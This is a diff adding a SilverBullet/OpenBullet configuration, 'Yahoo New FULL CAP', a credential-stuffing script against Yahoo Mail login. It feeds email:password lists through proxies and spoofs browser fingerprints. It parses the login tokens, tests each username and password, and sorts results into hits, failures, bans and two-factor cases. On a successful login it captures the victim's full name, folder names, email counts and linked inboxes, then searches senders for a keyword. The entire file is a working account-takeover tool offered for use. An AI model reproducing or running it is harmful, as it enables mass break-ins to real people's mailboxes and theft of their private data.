@@ -1,0 +1,179 @@
+[SETTINGS]
+{
+  "Name": "Yahoo New FULL CAP BY X - L O L + KEYWORD SEARCHER",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-21T18:04:22.4775923+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@X_LOL_4",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Keyword You Want To Search",
+      "VariableName": "KEY",
+      "Id": 728989899
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Yahoo New FULL CAP BY X - L O L + KEYWORD SEARCHER",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<USER>" Contains "@yahoo" 
+  KEYCHAIN Failure OR 
+    KEY "<USER>" DoesNotContain "@yahoo" 
+
+#GET REQUEST GET "https://login.yahoo.com/" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en,en-GB;q=0.9,en-US;q=0.8,fa;q=0.7,de;q=0.6" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36" 
+
+#ACRUMB PARSE "<SOURCE>" LR "name=\"acrumb\" value=\"" "\" />" -> VAR "AC" 
+
+#CRUMB PARSE "<SOURCE>" LR "\"crumb\" value=\"" "\"" -> VAR "CR" 
+
+#SESS PARSE "<SOURCE>" LR "name=\"sessionIndex\" value=\"" "\" />" -> VAR "SI" 
+
+#LOGIN_EMAIL REQUEST POST "https://login.yahoo.com/" 
+  CONTENT "browser-fp-data=%7B%22language%22%3A%22en%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Europe%2FBerlin%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~ANGLE%20(Intel(R)%20HD%20Graphics%20Family%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A34%2C%22hash%22%3A%22925f475275d9b2b56cb1d119b3e8b0cc%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221366%22%2C%22h%22%3A%22768%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22728%22%2C%22h%22%3A%221366%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1600778389650%2C%22render%22%3A1600778393051%7D%7D&crumb=<CR>&acrumb=<AC>&sessionIndex=<SI>&displayName=&username=<USER>&passwd=&signin=Next&persistent=y" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en,en-GB;q=0.9,en-US;q=0.8,fa;q=0.7,de;q=0.6" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+#CHECK_USER KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "INVALID_USERNAME" 
+    KEY "ERROR_NOTFOUND" 
+    KEY "/account/challenge/yak-code" 
+    KEY "/account/challenge/push" 
+    KEY "\"location\":\"/account/challenge/fail" 
+    KEY "Sorry, we don't recognize this account" 
+    KEY "INVALID_IDENTIFIER" 
+  KEYCHAIN Success OR 
+    KEY "\"location\":\"/account/challenge/password" 
+  KEYCHAIN Ban OR 
+    KEY "location\":\"/account/challenge/recaptcha" 
+
+#LOGIN_PASS REQUEST POST "https://login.yahoo.com/account/challenge/password?display=login&.intl=gb&.lang=en-GB&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd&prefill=0&prompt=login&chllngnm=fail&sessionIndex=<SI>&acrumb=<AC>&authMechanism=primary" 
+  CONTENT "browser-fp-data=%7B%22language%22%3A%22en%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Europe%2FBerlin%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google+Inc.%7EANGLE+%28Intel%28R%29+HD+Graphics+Family+Direct3D11+vs_5_0+ps_5_0%29%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A34%2C%22hash%22%3A%22925f475275d9b2b56cb1d119b3e8b0cc%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221366%22%2C%22h%22%3A%22768%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22728%22%2C%22h%22%3A%221366%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1602516110989%2C%22render%22%3A1602516111427%7D%7D&crumb=<CR>&acrumb=<AC>&sessionIndex=<SI>&displayName=<USER>&username=<USER>&passwordContext=normal&password=<PASS>&verifyPassword=Next" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en,en-GB;q=0.9,en-US;q=0.8,fa;q=0.7,de;q=0.6" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com/account/challenge/password?display=login&.intl=gb&.lang=en-GB&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd&prefill=0&prompt=login&chllngnm=fail&sessionIndex=<SI>&acrumb=<AC>&authMechanism=primary" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "https://mail.yahoo.com" 
+    KEY "<ADDRESS>" Contains "https://maktoob.yahoo.com" 
+    KEY "Sign Out" 
+    KEY "Add or manage accounts" 
+    KEY "lose access to your account" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "some unusual account activity" 
+
+#Folder_Names PARSE "<SOURCE>" LR "data-test-folder-container=\"" "\" data-te" Recursive=TRUE CreateEmpty=FALSE -> CAP "Folder Names" 
+
+#Emails PARSE "<SOURCE>" LR "data-test-unread-count=\"" "\"" -> VAR "T" 
+
+#Emails PARSE "<SOURCE>" LR "data-test-total-count=\"" "\"" -> VAR "U" 
+
+#Emails FUNCTION Constant "Total:<U> (<T> Unread)" -> CAP "Emails" 
+
+#USERNAME PARSE "<SOURCE>" LR "class=\"_yb_1y4o1 _yb_1jngi _yb_1h7qw\">" "</" CreateEmpty=FALSE -> CAP "FULL NAME" 
+
+#LINKED_WITH PARSE "<SOURCE>" LR "From: " "." Recursive=TRUE CreateEmpty=FALSE -> CAP "LINKED WITH" 
+
+#LINKED_INBOX PARSE "<SOURCE>" LR "data-test-account-email=\"" "\" data-test-is-activ" Recursive=TRUE CreateEmpty=FALSE -> CAP "LINKED INBOX" 
+
+#SEARCHE_KEYWORD KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<LINKED WITH>" Contains "<KEY>" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<LINKED WITH>" DoesNotContain "<KEY>" 
+
+#BY FUNCTION Constant "@X_LOL_4" -> CAP "BY" 
+
